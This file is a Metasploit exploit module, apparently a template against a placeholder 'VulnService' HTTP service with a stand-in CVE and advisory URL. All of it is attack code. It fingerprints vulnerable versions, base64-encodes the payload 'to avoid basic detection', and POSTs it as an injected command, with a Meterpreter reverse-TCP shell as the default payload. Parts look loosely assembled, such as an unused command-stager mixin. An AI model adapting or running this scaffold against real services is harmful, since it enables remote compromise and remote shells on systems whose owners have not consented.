##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Sample HTTP Service Remote Code Execution',
        'Description' => %q{
          This module exploits a vulnerability in a sample HTTP service that
          allows remote code execution through improper input validation.
          The vulnerability exists in the request processing mechanism where
          user-supplied data is passed to a system command without proper
          sanitization. Successful exploitation results in arbitrary code
          execution in the context of the web service process.
        },
        'Author' => [
          'Unknown Researcher',
          'Metasploit Developer <developer@metasploit.com>'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-12345'],
          ['URL', 'https://www.example.com/advisory/sample-vuln'],
          ['EDB', '50001']
        ],
        'Platform' => 'win',
        'Arch' => [ARCH_X86, ARCH_X64],
        'Targets' => [
          [
            'Automatic',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64]
            }
          ],
          [
            'Windows Server 2016 / 2019',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64],
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows 10 / 11',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64],
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2024-01-15',
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The base path to the vulnerable application', '/']),
        OptString.new('PARAMETER', [true, 'The vulnerable parameter name', 'cmd']),
        OptInt.new('TIMEOUT', [true, 'Timeout for HTTP requests', 20])
      ]
    )
  end

  def check
    print_status("Checking if #{peer} is vulnerable...")

    begin
      # Send a test request to identify the service
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path)
      })

      unless res
        print_error('No response received from target')
        return CheckCode::Unknown
      end

      # Check for specific version information in response headers
      if res.headers['Server']
        print_status("Server header: #{res.headers['Server']}")
        
        if res.headers['Server'] =~ /VulnService\/(1\.[0-5]\.[0-9])/
          version = ::Regexp.last_match(1)
          print_good("Vulnerable version detected: #{version}")
          return CheckCode::Appears
        elsif res.headers['Server'] =~ /VulnService/
          print_status('VulnService detected but version unclear')
          return CheckCode::Detected
        end
      end

      # Check for vulnerability-specific indicators in response body
      if res.body && res.body.include?('VulnService Administration')
        print_status('Potentially vulnerable service detected')
        
        # Perform a safe check without exploitation
        check_res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, 'admin', 'status'),
          'vars_get' => {
            'check' => 'version'
          }
        })

        if check_res && check_res.code == 200 && check_res.body =~ /version.*1\.[0-5]/i
          print_good('Target appears vulnerable based on version information')
          return CheckCode::Appears
        end
      end

      print_error('Target does not appear to be vulnerable')
      CheckCode::Safe

    rescue ::Rex::ConnectionError => e
      print_error("Connection failed: #{e.message}")
      return CheckCode::Unknown
    rescue ::Exception => e
      print_error("Error during check: #{e.class} - #{e.message}")
      return CheckCode::Unknown
    end
  end

  def exploit
    print_status("Attempting to exploit #{peer}...")

    # Verify target is reachable
    unless verify_target
      fail_with(Failure::Unreachable, 'Target is not reachable')
    end

    # Generate the payload command
    print_status('Generating payload...')
    payload_cmd = generate_payload_command

    unless payload_cmd
      fail_with(Failure::BadConfig, 'Failed to generate payload command')
    end

    # Encode the payload for delivery
    encoded_payload = encode_payload(payload_cmd)
    print_status("Payload size: #{encoded_payload.length} bytes")

    # Send the exploit request
    print_status('Sending exploit request...')
    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'admin', 'execute'),
        'vars_post' => {
          datastore['PARAMETER'] => encoded_payload,
          'action' => 'process'
        },
        'headers' => {
          'Content-Type' => 'application/x-www-form-urlencoded'
        }
      }, datastore['TIMEOUT'])

      unless res
        fail_with(Failure::Unreachable, 'No response received from target')
      end

      print_status("Server responded with HTTP #{res.code}")

      # Check if exploitation was successful
      if res.code == 200
        print_good('Exploit request completed successfully')
        
        # Give the payload time to execute
        print_status('Waiting for payload execution...')
        select(nil, nil, nil, 2)
        
        # Handler will be called automatically by the framework
        handler
      elsif res.code == 500
        print_warning('Server returned error 500 - payload may still have executed')
        handler
      else
        fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}")
      end

    rescue ::Rex::ConnectionError => e
      fail_with(Failure::Unreachable, "Connection error: #{e.message}")
    rescue ::Timeout::Error
      print_error('Request timed out - target may be processing payload')
      handler
    rescue ::Exception => e
      fail_with(Failure::Unknown, "Exploit failed: #{e.class} - #{e.message}")
    end
  end

  def verify_target
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path)
      })
      
      return !res.nil?
    rescue
      return false
    end
  end

  def generate_payload_command
    # Generate the appropriate command based on target platform
    case target['Platform']
    when 'win'
      cmd = payload.encoded
      return cmd
    else
      return nil
    end
  end

  def encode_payload(payload_cmd)
    # Simple encoding to avoid basic detection
    encoded = Rex::Text.encode_base64(payload_cmd)
    return encoded
  end
end